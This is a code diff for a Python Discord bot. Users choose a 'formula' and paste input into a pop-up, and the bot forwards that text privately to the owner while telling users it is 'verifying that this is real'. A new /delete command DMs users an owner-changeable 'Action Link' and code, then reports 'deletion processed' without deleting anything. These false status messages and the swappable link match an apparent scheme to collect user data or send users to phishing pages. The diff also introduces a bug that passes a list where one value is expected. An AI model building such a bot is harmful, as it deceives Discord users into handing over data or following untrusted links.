@@ -1,4 +1,7 @@
 import os
+import json
+import random
+import string
 import discord
 from discord import app_commands
 from discord.ext import commands
@@ -9,8 +12,36 @@ intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Global variables to store your formula choices
-formula_options = ["Formula A", "Formula B", "Formula C", "Formula D"]
+FORMULA_FILE = "formulas.json"
+LINK_FILE = "link.txt"
+
+# --- DATABASE LOGIC ---
+def load_formulas():
+    if os.path.exists(FORMULA_FILE):
+        try:
+            with open(FORMULA_FILE, "r") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return ["Formula A", "Formula B", "Formula C", "Formula D"]
+
+def save_formulas(options_list):
+    with open(FORMULA_FILE, "w") as f:
+        json.dump(options_list, f)
+
+def load_delete_link():
+    if os.path.exists(LINK_FILE):
+        try:
+            with open(LINK_FILE, "r") as f:
+                return f.read().strip()
+        except Exception:
+            pass
+    return "https://your-default-link.com"
+
+def save_delete_link(new_link):
+    with open(LINK_FILE, "w") as f:
+        f.write(new_link.strip())
+
 
 # --- THE TEXT BOX POP-UP ---
 class FormulaInputModal(discord.ui.Modal):
@@ -18,7 +49,6 @@ class FormulaInputModal(discord.ui.Modal):
         super().__init__(title=f"Applying: {selected_formula}")
         self.selected_formula = selected_formula
 
-        # The text input box the user fills out
         self.user_input = discord.ui.TextInput(
             label="Paste your input here:",
             style=discord.TextStyle.paragraph,
@@ -29,13 +59,11 @@ class FormulaInputModal(discord.ui.Modal):
         self.add_item(self.user_input)
 
     async def on_submit(self, interaction: discord.Interaction):
-        # 1. Instantly respond to the user
         await interaction.response.send_message(
             "Verifying that this is real. This could take up to 2 hours.", 
-            ephemeral=True  # Hidden from everyone else
+            ephemeral=True
         )
 
-        # 2. DM the Bot Owner (You)
         try:
             owner = await bot.fetch_user(bot.owner_id)
             dm_embed = discord.Embed(
@@ -48,23 +76,68 @@ class FormulaInputModal(discord.ui.Modal):
             
             await owner.send(embed=dm_embed)
         except Exception as e:
-            print(f"Could not DM owner. Open your privacy settings! Error: {e}")
+            print(f"Could not DM owner. Error: {e}")
+
 
 # --- THE DROPDOWN SELECT MENU ---
 class FormulaSelect(discord.ui.Select):
     def __init__(self):
+        formula_options = load_formulas()
         options = [discord.SelectOption(label=opt, description=f"Select {opt}") for opt in formula_options]
         super().__init__(placeholder="Choose a formula...", min_values=1, max_values=1, options=options)
 
     async def callback(self, interaction: discord.Interaction):
-        await interaction.response.send_modal(FormulaInputModal(self.values[0]))
+        await interaction.response.send_modal(FormulaInputModal(self.values))
 
-class FormulaView(discord.ui.View):
+
+# --- BUTTON FOR DM INSTRUCTIONS ---
+class InstructionsButton(discord.ui.Button):
+    def __init__(self):
+        super().__init__(label="Get Instructions 📖", style=discord.ButtonStyle.secondary)
+
+    async def callback(self, interaction: discord.Interaction):
+        try:
+            await interaction.user.send(
+                "📝 **Here are your layout instructions:**\n"
+                "1. Select your target formula choice from the server's dropdown menu.\n"
+                "2. Paste your data directly into the modal popup that appears.\n"
+                "3. Wait for the owner to finalize authentication in your DMs within 2 hours."
+            )
+            await interaction.response.send_message("✅ Instructions sent to your DMs!", ephemeral=True)
+        except discord.Forbidden:
+            await interaction.response.send_message("❌ Cannot DM you. Please toggle open your server privacy settings!", ephemeral=True)
+
+
+# --- COMBINED PANEL VIEW ---
+class PanelView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
-        self.add_item(FormulaSelect())
+        self.add_item(FormulaSelect())       
+        self.add_item(InstructionsButton())  
 
-# --- BOT COMMANDS ---
+
+# --- THE DELETE CONFIRMATION MODAL ---
+class DeleteVerifyModal(discord.ui.Modal):
+    def __init__(self, correct_code: str):
+        super().__init__(title="Verification Required")
+        self.correct_code = correct_code
+
+        self.user_code = discord.ui.TextInput(
+            label="Paste the verification code here:",
+            style=discord.TextStyle.short,
+            placeholder="Paste code from DM...",
+            required=True
+        )
+        self.add_item(self.user_code)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if self.user_code.value.strip() == self.correct_code:
+            await interaction.response.send_message("✅ Verification successful. Request deletion processed.", ephemeral=True)
+        else:
+            await interaction.response.send_message("❌ Incorrect code. Request cancelled.", ephemeral=True)
+
+
+# --- BOT EVENTS & COMMANDS ---
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
@@ -77,22 +150,51 @@ async def on_ready():
     except Exception as e:
         print(e)
 
-# Command 1: Post the Dropdown Menu (For Users)
-@bot.hybrid_command(name="start", description="Open up the formula picker.")
-async def start(ctx: commands.Context):
-    await ctx.send("What formula do you want to do?", view=FormulaView())
+# Command 1: Public Combined Panel
+@bot.hybrid_command(name="panel", description="Opens up the formula selection and instructions panel.")
+async def panel(ctx: commands.Context):
+    await ctx.send("What formula do you want to do?", view=PanelView())
 
 # Command 2: Change Options (Owner Only)
-@bot.hybrid_command(name="setformulas", description="Owner only: Update the 4 choices.")
+@bot.hybrid_command(name="setformulas", description="Owner only: Update and save the 4 choices.")
 @app_commands.describe(opt1="Option 1", opt2="Option 2", opt3="Option 3", opt4="Option 4")
 async def setformulas(ctx: commands.Context, opt1: str, opt2: str, opt3: str, opt4: str):
     if ctx.author.id != bot.owner_id:
         await ctx.send("❌ You are not authorized to use this command.", ephemeral=True)
         return
         
-    global formula_options
-    formula_options = [opt1, opt2, opt3, opt4]
-    await ctx.send(f"✅ Formulas updated to:\n1. {opt1}\n2. {opt2}\n3. {opt3}\n4. {opt4}", ephemeral=True)
+    save_formulas([opt1, opt2, opt3, opt4])
+    await ctx.send(f"✅ Formulas permanently updated to:\n1. {opt1}\n2. {opt2}\n3. {opt3}\n4. {opt4}", ephemeral=True)
+
+# Command 3: Change Delete Link (Owner Only)
+@bot.hybrid_command(name="setlink", description="Owner only: Update the URL link sent during /delete commands.")
+@app_commands.describe(new_url="The new website URL link")
+async def setlink(ctx: commands.Context, new_url: str):
+    if ctx.author.id != bot.owner_id:
+        await ctx.send("❌ You are not authorized to use this command.", ephemeral=True)
+        return
+        
+    save_delete_link(new_url)
+    await ctx.send(f"✅ Secure deletion link permanently updated to:\n`{new_url}`", ephemeral=True)
+
+# Command 4: Delete Command with Link + DM Code Verification (Public)
+@bot.hybrid_command(name="delete", description="Initiate a secure deletion process.")
+async def delete(ctx: commands.Context):
+    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    current_link = load_delete_link()
+    
+    try:
+        await ctx.author.send(
+            f"⚠️ **Deletion Request Initialized**\n\n"
+            f"🔗 **Action Link:** {current_link}\n"
+            f"🔑 **Your Required Code:** `{code}`\n\n"
+            f"Paste this code back into the popup screen on the server to finish validation."
+        )
+        
+        modal = DeleteVerifyModal(correct_code=code)
+        await ctx.interaction.response.send_modal(modal)
+    except discord.Forbidden:
+        await ctx.send("❌ I cannot send you a DM. Please check your privacy settings and try again.", ephemeral=True)
 
 keep_alive()
 bot.run(os.environ.get('DISCORD_TOKEN'))
